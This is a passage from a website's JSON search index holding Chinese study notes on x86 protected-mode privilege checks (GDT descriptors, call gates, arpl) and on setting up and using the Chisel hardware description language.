<li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5982\u679c cc \u6ee1\u8db3\uff0c\u5219\u5c06\u5b57\u8282 dest \u8bbe\u4e3a 1\uff0c\u5426\u5219\u8bbe\u4e3a 0</li> <li>\u6ce8\u610f\uff1acc \u540c jcc\uff0cdest \u4e3a 8 \u4f4d\u5bc4\u5b58\u5668\u6216\u5b57\u8282\u5927\u5c0f\u5b58\u50a8\u5355\u5143</li> </ul>"},{"location":"cs/pl/asm/#_57","title":"\u5b57\u7b26\u4e32\u7c7b\u6307\u4ee4","text":"<p>\u9488\u5bf9 32 \u4f4d\u65b0\u589e CMPSD LODSD SCASD STOSD MOVSD INSD OUTSD \u4e03\u4e2a\u5b57\u7b26\u4e32\u76f8\u5173\u6307\u4ee4\uff0c\u610f\u4e49\u5747\u548c 8086 / 80186 \u7c7b\u4f3c\uff0c\u4e0d\u518d\u8d58\u8ff0</p>"},{"location":"cs/pl/asm/#_58","title":"\u63a7\u5236\u8f6c\u79fb\u6307\u4ee4","text":"<p>\u9488\u5bf9 32 \u4f4d\u65b0\u589e IRETD \u6307\u4ee4\uff08\u4e0e IRET \u76f8\u540c\uff0c\u673a\u5668\u7801\u4e5f\u76f8\u540c\uff09\uff0cJECXZ \u6307\u4ee4\uff08jump if ecx equal zero\uff09\u4e0d\u518d\u8d58\u8ff0</p>"},{"location":"cs/pl/asm/#80386_1","title":"80386 \u4fdd\u62a4\u6a21\u5f0f\u539f\u7406","text":""},{"location":"cs/pl/asm/#_59","title":"\u5b9e\u6a21\u5f0f\u4e0e\u4fdd\u62a4\u6a21\u5f0f\u7684\u533a\u522b","text":"<ul> <li>\u5b9e\u6a21\u5f0f\uff08real mode\uff09<ul> <li>\u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u5747\u4e3a 16 \u4f4d</li> <li>\u6bb5\u5730\u5740*10h + \u504f\u79fb\u5730\u5740 = \u7269\u7406\u5730\u5740</li> <li>\u6bcf\u4e2a\u6bb5\u7684\u6700\u5927\u957f\u5ea6 = 10000h \u5b57\u8282</li> <li>\u6bcf\u4e2a\u6bb5\u540c\u65f6\u5177\u6709 Read Write eXecute \u5c5e\u6027</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u4ee3\u7801\u6ca1\u6709\u6743\u9650\u4e0a\u7684\u5dee\u522b\uff0c\u90fd\u662f ring0\uff08\u6700\u9ad8\u6743\u9650\uff09</li> </ul> </li> <li>\u4fdd\u62a4\u6a21\u5f0f\uff08protected mode\uff09<ul> <li>\u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u53ef\u4ee5\u662f 16\u4f4d:16\u4f4d \u4e5f\u53ef\u4ee5\u662f 16\u4f4d:32\u4f4d</li> <li>gdt[\u6bb5\u5730\u5740].base_addr + \u504f\u79fb\u5730\u5740 = \u7269\u7406\u5730\u5740</li> <li>\u6bcf\u4e2a\u6bb5\u7684\u6700\u5927\u957f\u5ea6 = 4G \u5b57\u8282</li> <li>\u6570\u636e\u6bb5\u7684\u5c5e\u6027\uff1a\u53ea\u8bfb\u3001\u8bfb\u5199</li> <li>\u4ee3\u7801\u6bb5\u7684\u5c5e\u6027\uff1a\u53ea\u6267\u884c\u4e0d\u53ef\u8bfb\u3001\u53ef\u6267\u884c\u53ef\u8bfb</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u4ee3\u7801\u6709\u6743\u9650\u4e0a\u7684\u5dee\u522b\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4e3a ring0\uff0c\u7528\u6237\u4ee3\u7801\u4e3a ring3</li> </ul> </li> </ul> <p>\u963b\u6b62 ring3 \u7684\u4ee3\u7801\u8bbf\u95ee ring0 \u7684\u6570\u636e\uff1a</p> <pre><code>mov ax, \u6bb5\u5730\u5740\nmov ds, ax          ; \u8fd9\u4e00\u6b65\u4f1a\u88ab\u9650\u5236\nmov ebx, \u504f\u79fb\u5730\u5740\nmov al, ds:[ebx]\n</code></pre> <p>\u5f53\u6bb5\u5bc4\u5b58\u5668\u88ab\u8d4b\u503c\u7684\u65f6\u5019\uff0cCPU \u4f1a\u8fdb\u884c\u6743\u9650\u68c0\u67e5\uff0c\u628a\u5f53\u524d cs \u7684\u4f4e 2 \u4f4d\u548c\u6bb5\u5730\u5740\u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u6240\u5305\u542b\u7684 DPL \u8fdb\u884c\u6bd4\u8f83\u5982\u679c \u201ccs.cpl &lt;= \u6bb5\u5730\u5740-&gt;\u63cf\u8ff0\u7b26.DPL\u201d \u5219\u5141\u8bb8\u8bbf\u95ee\uff0c\u5426\u5219\u4ea7\u751f General Protection Fault</p> <p>CPL\uff08current privilege level\uff09\u5373 cs \u7684\u4f4e 2 \u4f4d\uff0c\u8868\u793a\u5f53\u524d\u7a0b\u5e8f\u7684\u6743\u9650\uff0cDPL\uff08descriptor privilege level\uff09\u8868\u793a\u6bb5\u5730\u5740\u5bf9\u5e94\u63cf\u8ff0\u7b26\u7684\u6743\u9650\u3002\u610f\u4e49\u5373\u662f ring?\uff0c\u6570\u5b57\u8d8a\u5c0f\u6743\u9650\u8d8a\u5927</p>"},{"location":"cs/pl/asm/#_60","title":"\u6bb5\u63cf\u8ff0\u7b26","text":"<p>gdt\uff08global descriptor table\uff09\u5168\u5c40\u63cf\u8ff0\u7b26\u8868\uff0c\u662f\u4e00\u4e2a\u7ed3\u6784\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u5747\u4e3a 8 \u5b57\u8282\u3002</p> <p>\u7a0b\u5e8f\u4e2d\u7684\u6bb5\u5730\u5740\u5b9e\u9645\u4e0a\u53eb selector\uff0cselector \u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u4e3a gdt+(selector&amp;0FFF8h) \u5904\u7684 8 \u5b57\u8282\uff08\u5373\u4e22\u6389 selector \u7684\u4f4e 3 \u4f4d\uff09</p> <pre><code>gdt+00h\ngdt+08h\n                    +---+---+-base_addr--+\n                    |   |   |            |\n                    --  --  --          --\ngdt+10h     FF, FF, 00, 80, 0B, F3, 0F, 00      ; \u6574\u4f53 8 \u5b57\u8282\u662f\u6bb5\u5730\u5740 10h \u7684\u63cf\u8ff0\u7b26\uff08descriptor\uff09\n            ~~  ~~              ==  ^~\n            +---+---------------|---|+\n                |               |   +-- Granularity = bit 7\n                |               +-- DPL = bit 6, 5 = 11\n                +-- limit           ||\n                                    ||\n                       1111 0011 &lt;- 0F\n                       |--| | ||\n                       |  | | |+-- Accessed \n                       |  | | +-- bit 1\n                       |  | +-- bit 3\n                       |  +-- S\n                       +-- Present = bit 7\ngdt+18h\n</code></pre> <ul> <li>\u7b2c 5 \u4e2a\u5b57\u8282\u7684\u7b2c 6\u30015 \u4e2a bit \u4e3a DPL<ul> <li>\u4f8b\u4e0a\u9762 10h \u6bb5\u7684 DPL \u4e3a 11b \u5373 3\uff08F3 -&gt; 1111 0011\uff09</li> </ul> </li> <li>\u7b2c 2\u30013\u30014\u30017 \u4e2a\u5b57\u8282\u4e3a\u6bb5\u8d77\u59cb\u5730\u5740 base_addr\uff0c\u5c0f\u7aef\u5e8f<ul> <li>\u4f8b\u4e0a\u9762 10h \u6bb5\u7684\u6bb5\u8d77\u59cb\u5730\u5740\u4e3a 000B8000h</li> </ul> </li> <li>\u7b2c 0\u30011 \u4e2a\u5b57\u8282\u548c\u7b2c 6 \u4e2a\u5b57\u8282\u7684\u540e\u534a\u4e2a\u5b57\u8282\u4e3a\u6700\u5927\u504f\u79fb\u5730\u5740 limit\uff0c\u5c0f\u7aef\u5e8f<ul> <li>\u4f8b\u4e0a\u9762 10h \u6bb5\u7684\u6700\u5927\u504f\u79fb\u5730\u5740\u4e3a 0FFFFFh\uff0c\u6700\u5c0f\u504f\u79fb\u5730\u5740\u4e3a 0\uff0c\u6240\u4ee5\u6bb5\u957f\u5ea6\u4e3a 100000h \u5373 1M</li> </ul> </li> <li>\u7b2c 6 \u4e2a\u5b57\u8282\u7684\u7b2c 7 \u4e2a bit \u4e3a\u7c92\u5ea6 Granularity\uff0c\u5f53\u8be5\u4f4d\u4e3a 1 \u65f6\uff0climit \u7684\u5355\u4f4d\u53d8\u6210 page\uff08\u9875\uff0c\u4e00\u9875\u4e3a 4k=1000h \u5b57\u8282\uff09<ul> <li>\u4f8b\u5982\u5982\u679c limit \u4e3a FFFFF\uff0cG \u4e3a 1\uff0c\u5219\u6700\u5927\u504f\u79fb\u5730\u5740\u53d8\u4e3a FFFFFFFF\uff08\u6700\u540e\u4e00\u9875\u7684\u5730\u5740\u4e3a [FFFFF000, FFFFFFFF]\uff09</li> </ul> </li> <li>\u7b2c 5 \u4e2a\u5b57\u8282\u7684\u5176\u5b83 bit<ul> <li>\u7b2c 7 bit \u4e3a Present\uff0c\u8868\u793a\u8be5\u6bb5\u662f\u5426\u5b58\u5728</li> <li>\u7b2c 4 bit \u4e3a S\uff0cS = 1 \u8868\u793a\u662f\u6570\u636e\u6bb5\u6216\u4ee3\u7801\u6bb5\uff0c0 \u5219\u662f\u7cfb\u7edf\u63cf\u8ff0\u7b26\uff08\u5305\u62ec\u4e0b\u9762\u7684 call gate\uff09</li> <li>\u7b2c 3 bit \u4e3a 0 \u8868\u793a\u662f\u6570\u636e\u6bb5\uff0c1 \u8868\u793a\u662f\u4ee3\u7801\u6bb5</li> <li>\u7b2c 1 bit\uff0c\u5982\u679c\u662f\u6570\u636e\u6bb5\uff0c\u5219 1 \u8868\u793a\u53ef\u5199\uff0c\u4ee3\u7801\u6bb5\u65f6 1 \u8868\u793a\u53ef\u8bfb</li> <li>\u7b2c 0 bit \u4e3a Accessed \u8868\u793a\u63cf\u8ff0\u7b26\u662f\u5426\u88ab\u8bbf\u95ee\u8fc7</li> </ul> </li> </ul> <p>\u6bb5\u5730\u5740\uff08\u5176\u5b9e\u53eb selector\uff0910h \u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u7684 DPL \u4e3a 11\uff0c\u5373\u6743\u9650\u4e3a ring3\uff08DPL \u4e3a 3\uff08\u6700\u4f4e\uff09\u7684\u65f6\u5019\u6240\u6709\u7a0b\u5e8f\u90fd\u662f\u6709\u6743\u8bbf\u95ee\u7684\uff09</p> <p>\u5047\u8bbe\u524d\u9762\u90a3\u6bb5\u4ee3\u7801\u4e2d\u8d4b\u503c\u7ed9 ax \u7684\u6bb5\u5730\u5740\u4e3a 10h\uff0ccs \u4e3a 08h\uff080000 1000\uff09\uff0c\u5219 cs.cpl = 00\uff0c\u4e8e\u662f cs.cpl &lt; 10h-&gt;descriptor.DPL\uff0c\u56e0\u6b64\u5f53\u524d\u7a0b\u5e8f\u6709\u6743\u628a ds \u8d4b\u503c\u4e3a 10h\uff0c\u5373\u6709\u6743\u8bbf\u95ee\u8be5\u6bb5\u4e2d\u7684\u6570\u636e</p> <p>\u82e5\u6bb5\u63cf\u8ff0\u7b26\u63cf\u8ff0\u7684\u662f\u4e00\u4e2a\u6570\u636e\u6bb5\uff0c\u5219\u8bbf\u95ee\u8005\u7684 CPL \u5fc5\u987b\u5c0f\u4e8e\u7b49\u4e8e\u8be5\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL\u3002\u82e5\u6bb5\u63cf\u8ff0\u7b26\u63cf\u8ff0\u7684\u662f\u4e00\u4e2a\u4ee3\u7801\u6bb5\uff0c\u5219\u8bbf\u95ee\u8005\u7684 CPL \u5fc5\u987b\u7b49\u4e8e\u8be5\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL \u624d\u80fd jmp\u3001call \u5230\u8be5\u6bb5\u91cc\u9762\u7684\u51fd\u6570</p> <p>\u5f53\u8bbf\u95ee\u8005\u7684 CPL \u5927\u4e8e\u67d0\u4e2a\u4ee3\u7801\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL \u65f6\uff0c\u5219\u53ea\u80fd\u7528 call call_gate_selector:0 \u8fd9\u6837\u7684\u65b9\u5f0f\u95f4\u63a5\u8c03\u7528\u8be5\u4ee3\u7801\u6bb5\u4e2d\u7684\u51fd\u6570</p>"},{"location":"cs/pl/asm/#call-gate","title":"call gate","text":"<p>call gate \u5373\u8c03\u7528\u95e8\uff0c\u53ef\u4ee5\u770b\u4f5c\u4f4e\u6743\u9650\u8c03\u7528\u9ad8\u6743\u9650\u51fd\u6570\u7684\u8df3\u677f\u3002\u5b83\u672c\u8eab\u9700\u8981\u7528 8 \u4e2a\u5b57\u8282\u6765\u63cf\u8ff0\uff0c\u683c\u5f0f\u4f8b\u5982\uff1a</p> <pre><code>            +---+--------------------+---+-- \u76ee\u6807\u51fd\u6570\u504f\u79fb\u5730\u5740\n            |   |                    |   |\n            --  --                  --  --\ngdt+20h     78, 56, 08, 00, 02, EC, 34, 12\n                    ==  ==  ^^  ~~\n                    |    |  |   |\n            +-------|----|--|---+---- \u5c5e\u6027\n            |       |    |  +---- \u53c2\u6570\u7684\u4e2a\u6570\n            |       +----+---- \u76ee\u6807\u51fd\u6570\u7684\u6bb5\u5730\u5740\uff08selector\uff09\n            |\n            EC = 1110 1100\n                 |==^ ----\n                 || | |\n                 || | +-- type\uff0c0C \u5373\u8868\u793a\u662f 32 \u4f4d\u8c03\u7528\u95e8\n                 || +-- S = 0\uff0c\u662f\u7cfb\u7edf\u63cf\u8ff0\u7b26\n                 |+-- DPL\n                 +-- Present\n</code></pre> <p>\u5f53 gdt \u91cc\u7684 S = 0 \u65f6\uff0c\u8868\u793a\u5f53\u524d\u63cf\u8ff0\u7b26\u662f\u4e00\u4e2a\u7cfb\u7edf\u63cf\u8ff0\u7b26\u800c\u4e0d\u662f\u6570\u636e\u6bb5\u6216\u4ee3\u7801\u6bb5\u7684\u63cf\u8ff0\u7b26\u3002\u7cfb\u7edf\u63cf\u8ff0\u7b26\u6709 tss\uff08task state segment\uff09\u63cf\u8ff0\u7b26\u3001task gate \u63cf\u8ff0\u7b26\u3001interrupt gate \u63cf\u8ff0\u7b26\u3001trap gate \u63cf\u8ff0\u7b26\u7b49\uff0cS = 0 \u4e14 type = 1100b \u65f6\u5373\u8868\u793a\u5f53\u524d\u63cf\u8ff0\u7b26\u662f 32 \u4f4d\u7684\u8c03\u7528\u95e8</p> <p>\u5c5e\u6027\u4e2d\u7684 DPL \u662f call gate \u81ea\u5df1\u7684\u6743\u9650\u800c\u4e0d\u662f\u76ee\u6807\u51fd\u6570\u7684\u6743\u9650\uff0c\u76ee\u6807\u51fd\u6570\u7684 DPL \u8981\u901a\u8fc7\u7b2c 2\u30013 \u5b57\u8282\u7684 selector \u627e\u5230\u5bf9\u5e94\u63cf\u8ff0\u7b26\u7684 DPL</p> <p>\u8c03\u7528 call gate \u65f6\u7684\u6743\u9650\u6bd4\u8f83\uff1a</p> <ol> <li>\u8c03\u7528\u8005\u7684 CPL &lt;= call_gate_selector-&gt;descripter.DPL</li> <li>\u8c03\u7528\u8005\u7684 CPL &gt;= call_gate_selector-&gt;descriptor.target_selector-&gt;descriptor.DPL</li> </ol> <p>CPU \u4ece ROM \u542f\u52a8\u540e\u8fdb\u5165\u5b9e\u6a21\u5f0f\uff0c\u800c\u5b9e\u6a21\u5f0f\u7684\u6743\u9650\u90fd\u662f ring0\uff0c\u53ef\u4ee5\u5728\u5b9e\u6a21\u5f0f\u4e2d\u6267\u884c retf \u6765\u964d\u7ea7\u5230 ring3\u3002\u6784\u9020 jmp far ptr tss_selector:0 \u53ef\u4ee5\u4ece ring0 \u5f3a\u884c\u8df3\u56de ring3\uff08\u9700\u8981\u6784\u9020 tss \u4e0e\u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\uff09</p> <p>\u4ee5 memset(p, 0, n) \u4e3a\u4f8b\uff0cring0 \u51fd\u6570\u5982\u4f55\u9632\u6b62 ring3 \u4f20\u9012\u4e00\u4e2a\u6076\u610f\u7684\u6307\u9488\u5982 ring0 \u6307\u9488 p\u3002ring3 \u8fdb\u7a0b\u5047\u5982\u4e0d\u8c03\u7528 memset()\uff0c\u800c\u662f\u81ea\u5df1\u505a *p = ... \u7684\u5199\u5165\u4e00\u5b9a\u4f1a\u89e6\u53d1 GPF(General Protect Fault) \u5373\u5728\u8be5\u6307\u4ee4\u524d\u63d2\u5165\u5e76\u8c03\u7528 int 0Dh</p> <p>\u5047\u8bbe\u5728 ring3 \u4e2d\u8c03\u7528 memset(p, 0, 1) p = 0x2800000000\uff08\u5047\u8bbe 0x28 \u8fd9\u4e2a selector \u5bf9\u5e94\u6bb5\u7684 DPL \u662f 0\uff09 <pre><code>push 1\npush 0\npush 28h\npush 0\ncall far ptr call_gate_to_memset:0\n</code></pre> \u5f53\u8fd9\u6761 call \u53d1\u751f\u65f6\uff0cring3 \u7684\u5806\u6808\u4e2d\u4ec5\u6709 call \u6307\u4ee4\u4e0a\u65b9 push \u7684\u53c2\u6570\uff0c\u5e76\u6ca1\u6709\u4e0b\u6761\u6307\u4ee4\u7684\u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u3002CPU \u4f1a\u4ece\u5f53\u524d\u8fdb\u7a0b\u7684 tss\uff08task state segment\uff0c\u901a\u8fc7 ltr \u6307\u4ee4\u8d4b\u503c\uff09\u4e2d\u53d6\u51fa ss0 \u53ca esp0 \u4f5c\u4e3a\u65b0\u7684\u5806\u6808\u6307\u9488\uff08ss = ss0, esp = esp0\uff09\uff0c\u8fdb\u884c\u5806\u6808\u5207\u6362\u3002\u4e4b\u540e\u8fdb\u884c\u7684\u64cd\u4f5c\u6709\uff1a</p> <ol> <li>push ring3 \u7684 ss\u3001push ring3 \u7684 esp</li> <li>\u628a ring3 \u4e2d\u7684\u53c2\u6570\u5168\u90e8\u590d\u5236\u5230 ring0 \u5806\u6808\u4e2d</li> <li>push ring3 \u7684 cs\u3001push ring3 \u7684 eip</li> <li>jmp \u76ee\u6807\u51fd\u6570</li> </ol> <p>memset \u51fd\u6570\u4e2d\u4f1a\u53d6\u51fa\u8c03\u7528\u8005\u7684 cs\uff0c\u53d6\u51fa CPL \u4e0e\u53c2\u6570 p \u6bb5\u5730\u5740\u7684 DPL \u8fdb\u884c\u6bd4\u8f83</p> <pre><code>memset:\n    push ebp\n    mov ebp, esp\n    mov cx, [ebp+8]     ; \u8c03\u7528\u8005 ring3 \u7684 cs\n    mov ax, [ebp+10h]   ; 28h\n    arpl ax, cx         ; adjust request privilege level\n                        ; \u4f1a\u628a cx \u7684\u4f4e 2 \u4f4d\u590d\u5236\u7ed9 ax \u7684\u4f4e 2 \u4f4d\uff0c\u5373 ax \u53d8\u4e3a 2Bh\n    mov ds, ax          ; \u8fd9\u91cc\u4f1a\u89e6\u53d1 GPF\n                        ; CPU \u8fdb\u884c\u6743\u9650\u68c0\u67e5\uff0c\u5f53 cs.cpl &lt;= 28h \u6bb5\u7684 DPL \n                        ; &amp;&amp; ax.rpl &lt;= 28h \u6bb5\u7684 DPL \u65f6\u624d\u80fd\u8d4b\u503c\u6210\u529f\uff08ax.rpl \u5373 ax \u7684\u4f4e 2 \u4f4d\uff09\n</code></pre> arpl \u4fdd\u62a4\u6a21\u5f0f <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aarpl dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08adjust request privilege level\uff09\u5f53 src \u7684\u4f4e 2 \u4f4d\u5927\u4e8e dest \u7684\u4f4e 2 \u4f4d\u65f6\uff0c\u4f1a\u628a src \u7684\u4f4e 2 \u4f4d\u590d\u5236\u7ed9 dest \u7684\u4f4e 2 \u4f4d</li> <li>\u6ce8\u610f\uff1adest \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0csrc \u4e3a\u5bc4\u5b58\u5668</li> </ul>"},{"location":"cs/pl/chisel/","title":"Chisel","text":"<p> \u7ea6 1844 \u4e2a\u5b57  38 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>The Constructing Hardware in a Scala Embedded Language (Chisel) is an open-source hardware description language (HDL) used to describe digital electronics and circuits at the register-transfer level. Chisel is based on Scala as an embedded domain-specific language (DSL). Chisel inherits the object-oriented and functional programming aspects of Scala for describing digital hardware. Using Scala as a basis allows describing circuit generators. High quality, free access documentation exists in several languages.</p> <p>Circuits described in Chisel can be converted to a description in Verilog for synthesis and simulation.</p> <p>\u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1</p> <p>Abstract</p> <p>\u81ea\u5b66 Chisel \u7684\u7b14\u8bb0\u3002</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>Chisel Book</li> </ul>"},{"location":"cs/pl/chisel/#_1","title":"\u73af\u5883\u914d\u7f6e\u7b49","text":"<p>Chisel \u73af\u5883\u7684\u6574\u4f53\u6846\u67b6\u53ef\u4ee5\u7406\u89e3\u4e3a Chisel \u662f Scala \u7684\u4e00\u4e2a\u5e93\uff0cScala \u662f\u57fa\u4e8e JVM \u7684\u8bed\u8a00\uff0c\u6240\u4ee5\u8981\u5b89\u88c5 Java \u73af\u5883\u548c Scala\u3002\u800c\u4e14 Chisel \u7684\u7f16\u8bd1\u7ed3\u679c\u662f Verilog \u4ee3\u7801\uff0c\u6240\u4ee5\u8981\u60f3\u7efc\u5408\u3001\u4eff\u771f\u3001\u4e0a\u677f\u7b49\u5219\u9700\u8981\u989d\u5916\u914d\u7f6e\u7528\u7684 FPGA \u677f\u5b50\u76f8\u5e94\u7684\u5de5\u5177\u3002</p> <p>Chisel book \u4e0a\u8bf4 Scala \u4f9d\u8d56\u4e8e Java JDK 1.8 \u6216\u66f4\u9ad8\u7248\u672c\uff0c\u6216\u8005\u4f7f\u7528 OpenJDK 8 \u6216 11\uff0c\u53cd\u6b63 Java \u7684\u7248\u672c\u53f7\u6211\u5c31\u6ca1\u770b\u61c2\u8fc7\uff0c\u7535\u8111\u4e0a\u6070\u597d\u6709 JDK 1.8 \u6211\u5c31\u80fd\u8dd1\u5c31\u884c\u4e86\u3002</p> <p>\u7136\u540e mac \u4e0a\u5e84 Scala \u53ea\u9700\u8981\u88c5\u4e0b sbt\uff08scala build tool\uff09\uff1a<code>brew install sbt</code>\u3002book \u4e0a\u8fd8\u8bf4\u8981\u88c5 GTKWave\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7 <code>brew install homebrew/cask/gtkwave</code> \u6765\u5b89\u88c5\uff0c\u4e0d\u8fc7\u770b\u8d77\u6765\u662f\u4e2a\u663e\u793a\u6ce2\u5f62\u7684\uff0c\u76ee\u524d\u6ca1\u7528\u4e0a\u3002</p> <p>\u63a8\u8350\u7684 IDE \u662f IntelliJ IDEA\uff0c\u4e0d\u8fc7 vsc \u4e5f\u4e0d\u662f\u4e0d\u80fd\u7528\uff0c\u800c\u4e14\u4e5f\u63a8\u8350\u4e86\u4e00\u4e2a\u6269\u5c55 Scala (Metals)\uff0c\u8fd8\u53ef\u4ee5\u3002</p>"},{"location":"cs/pl/chisel/#_2","title":"\u6d4b\u8bd5","text":"<p>\u53ef\u4ee5\u7528 chisel book \u63d0\u4f9b\u7684 chisel-examples \u6765\u6d4b\u8bd5\uff1a</p> <pre><code>$ git clone https://github.com/schoeberl/chisel-examples.git\n$ cd chisel-examples/hello-world\n$ sbt run\n</code></pre> <p>\u5728\u4e0b\u8f7d\u4e00\u5806\u6a21\u5757\u540e\uff0c\u6b63\u5e38\u7684\u8bdd\u53ef\u4ee5\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u770b\u5230 Hello.v \u5373\u7f16\u8bd1\u51fa\u6765\u7684 verilog \u4ee3\u7801\uff0c\u914d\u5408 verilog/hello_top.v \u9876\u5c42\u6a21\u5757\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e86\u3002</p> <p>\u4e5f\u53ef\u4ee5\u901a\u8fc7 <code>sbt test</code> \u6765\u8fdb\u884c\u6d4b\u8bd5\uff0c\u8fd9\u91cc\u4f1a\u6a21\u62df\u5b9e\u9645\u8fd0\u884c\u60c5\u51b5\uff0c\u5e76\u4ea7\u751f\u8f93\u51fa\u7b49\u3002</p>"},{"location":"cs/pl/chisel/#chisel_1","title":"Chisel \u6784\u5efa\u6d41\u7a0b\u53ca\u6d4b\u8bd5","text":""},{"location":"cs/pl/chisel/#_3","title":"\u57fa\u7840\u7ec4\u4ef6","text":""},{"location":"cs/pl/chisel/#_4","title":"\u7c7b\u578b\u53ca\u5e38\u91cf","text":"<ul> <li>Bits\u3001UInt\u3001SInt \u90fd\u8868\u793a\u4e00\u7cfb\u5217\u6bd4\u7279\u6784\u6210\u7684\u5411\u91cf\uff0c\u4e0d\u8fc7\u542b\u4e49\u4e0d\u540c<ul> <li>Bits \u53ea\u662f\u4e00\u4e2a\u6bd4\u7279\u5e8f\u5217</li> <li>UInt \u8868\u793a\u4e00\u4e2a\u65e0\u7b26\u53f7\u6574\u6570</li> <li>SInt \u8868\u793a\u4e00\u4e2a\u6709\u7b26\u53f7\u6574\u6570\uff0c\u8d1f\u6570\u91c7\u7528\u8865\u7801\u8868\u793a</li> </ul> </li> <li>\u9700\u8981\u4ee5 type(Width) \u7684\u5f62\u5f0f\u6765\u6307\u5b9a\u4f4d\u5bbd<ul> <li>\u4f4d\u5bbd\u5199\u6cd5\u4e3a \u6570\u503c.W\uff0c\u6bd4\u5982 8.W</li> <li>UInt(8.W) \u8868\u793a\u4e00\u4e2a 8 \u4f4d\u7684\u65e0\u7b26\u53f7\u6574\u6570\uff0cSInt(10.W) \u8868\u793a\u4e00\u4e2a 10 \u4f4d\u7684\u6709\u7b26\u53f7\u6574\u6570</li> </ul> </li> <li>Chisel \u4e2d\u7684\u5e38\u91cf\u53ef\u4ee5\u4ee5\u7c7b\u4f3c\u5199\u6cd5 \u6570\u503c.\u7c7b\u578b\u7f29\u5199 \u8868\u793a<ul> <li>0.U \u8868\u793a\u4e00\u4e2a\u65e0\u7b26\u53f7\u5e38\u91cf 0\uff0c-3.S \u8868\u793a\u4e00\u4e2a\u6709\u7b26\u53f7\u5e38\u91cf -3</li> <li>\u53ef\u4ee5\u540c\u6837\u89c4\u5b9a\u4f4d\u5bbd\uff0c\u6bd4\u5982 3.U(4.W) \u8868\u793a\u4e00\u4e2a 4 \u4f4d\u7684\u65e0\u7b26\u53f7\u5e38\u91cf 3</li> <li>\u6ce8\u610f\uff1a\u6613\u9519\u7684\u5730\u65b9\u662f 3.U(4.W) \u4e0d\u80fd\u5199\u4e3a 3.U(4)\uff0c\u56e0\u4e3a (4) \u8868\u793a\u53d6\u7b2c 4 \u4f4d\u7684\u6bd4\u7279\uff0c\u540e\u9762\u4f1a\u7528\u5230</li> </ul> </li> <li>\u5176\u4ed6\u5e38\u91cf\u5b57\u9762\u91cf<ul> <li>\u53ef\u4ee5\u901a\u8fc7\u5b57\u7b26\u4e32\u52a0\u7c7b\u578b\u6765\u4f7f\u7528\u5176\u4ed6\u8fdb\u5236\uff0c\u5f00\u5934\u7528 h/o/b \u6807\u6ce8\uff0c\u6bd4\u5982\u4ee5\u4e0b\u5747\u8868\u793a 255\uff1a<ul> <li>\"hff\".U</li> <li>\"o377\".U</li> <li>\"b1111_1111\".U</li> </ul> </li> <li>\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5b57\u7b26\u4e32\u8868\u793a\u5176 ASCII \u7801\uff0c\u6bd4\u5982 'A'.U</li> </ul> </li> <li>\u5e03\u5c14\u7c7b\u578b Bool<ul> <li>\u503c\u6709 true.B \u548c false.B</li> </ul> </li> <li>\u4f7f\u7528 val \u5173\u952e\u5b57\u5b9a\u4e49\u53d8\u91cf</li> </ul>"},{"location":"cs/pl/chisel/#_5","title":"\u7ec4\u5408\u903b\u8f91\u7535\u8def","text":"<ul> <li>\u4f7f\u7528\u5e03\u5c14\u8fd0\u7b97\u7b26\u5373\u53ef\u63cf\u8ff0\u7ec4\u5408\u903b\u8f91\u7535\u8def<ul> <li>\u6bd4\u5982 <code>val logic = (a &amp; b) | c</code></li> </ul> </li> <li>\u4f4d\u8fd0\u7b97\u7b26<ul> <li><code>&amp; | ^ ~</code> \u5206\u522b\u8868\u793a\u4e0e\u3001\u6216\u3001\u5f02\u6216\u3001\u975e</li> <li><code>&lt;&lt; &gt;&gt;</code> \u5206\u522b\u8868\u793a\u5de6\u79fb\u3001\u53f3\u79fb</li> </ul> </li> <li>\u903b\u8f91\u8fd0\u7b97\u7b26<ul> <li><code>&amp;&amp; || !</code> \u5206\u522b\u8868\u793a\u4e0e\u3001\u6216\u3001\u975e\uff0c\u53ea\u80fd\u7528\u5728 Bool \u7c7b\u578b\u4e0a</li> <li><code>=== =/=</code> \u5206\u522b\u5224\u65ad\u662f\u5426\u76f8\u7b49/\u4e0d\u7b49</li> <li><code>&gt; &gt;= &lt; &lt;=</code> \u7528\u4e8e\u6bd4\u8f83\u5927\u5c0f</li> </ul> </li> <li>\u7b97\u6570\u8fd0\u7b97\u7b26\uff1a<ul> <li><code>+ -</code> \u52a0\u51cf/\u8d1f\uff0c\u7ed3\u679c\u7684\u4f4d\u5bbd\u662f\u4e24\u4e2a\u64cd\u4f5c\u6570\u4e2d\u8f83\u5927\u7684\u90a3\u4e2a<ul> <li><code>+&amp; -&amp;</code> \u4f1a\u6269\u5c55\u4e00\u4f4d</li> </ul> </li> <li><code>*</code> \u4e58\uff0c\u7ed3\u679c\u7684\u4f4d\u5bbd\u662f\u4e24\u4e2a\u64cd\u4f5c\u6570\u7684\u4f4d\u5bbd\u4e4b\u548c</li> <li><code>/ %</code> 